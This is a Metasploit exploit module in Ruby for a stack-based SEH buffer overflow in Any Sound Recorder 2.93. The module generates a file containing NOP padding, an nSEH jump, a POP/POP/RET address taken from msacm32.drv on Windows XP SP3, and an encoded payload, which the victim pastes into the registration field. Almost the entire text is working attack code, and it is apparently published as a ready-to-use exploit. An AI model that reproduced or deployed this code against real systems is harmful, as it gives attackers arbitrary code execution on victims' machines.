# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Seh
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;    => &#039;Any Sound Recorder 2.93 Buffer Overflow (SEH)&#039;,
      &#039;Description&#039;  => %q{
          This module exploits a stack based buffer overflow in Any Sound Recorder 2.93, when
          with the name "hack.txt". Copy the content of the  "hack.txt",Start Any Sound Recorder 2.93 click "Enter Key Code" Paste the content into field "User Name" click "Register"
      },
      &#039;License&#039;    => MSF_LICENSE,
      &#039;Author&#039;    =>
        [
          &#039;Abdullah Alıç&#039;,            # Original discovery
          &#039;d3ckx1 d3ck(at)qq.com&#039;,       # MSF module
        ],
      &#039;References&#039;  =>
        [
          [ &#039;OSVDB&#039;, &#039;&#039; ],
          [ &#039;EBD&#039;, &#039;45627&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;
        },
      &#039;Platform&#039;  => &#039;win&#039;,
      &#039;Payload&#039;   =>
        {
          &#039;BadChars&#039;    => "\x00\x0a\x0d",
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 10000
        },
      &#039;Targets&#039;   =>
        [
          [ &#039;Any Sound Recorder 2.93&#039;,
            {
              &#039;Ret&#039;     =>  0x72d12f35, # 0x72d12f35 : P/P/R FROM msacm32.drv form winxp sp3
              &#039;Offset&#039;  =>  900
            }
          ],
        ],
      &#039;Privileged&#039;  => false,
      &#039;DisclosureDate&#039;  => &#039;Oct 25 2018&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options([OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;msf.txt&#039;]),], self.class)
 
  end
 
  def exploit
    buf = "\x90"*(target[&#039;Offset&#039;])
    buf << "\xeb\x06#{Rex::Text.rand_text_alpha(2, payload_badchars)}" # nseh (jmp to payload)
    buf << [target.ret] .pack(&#039;V&#039;)  # seh
    buf << make_nops(10)
    buf << payload.encoded
    buf << "\x90" * 200
 
    file_create(buf)
    handler
     
  end
end

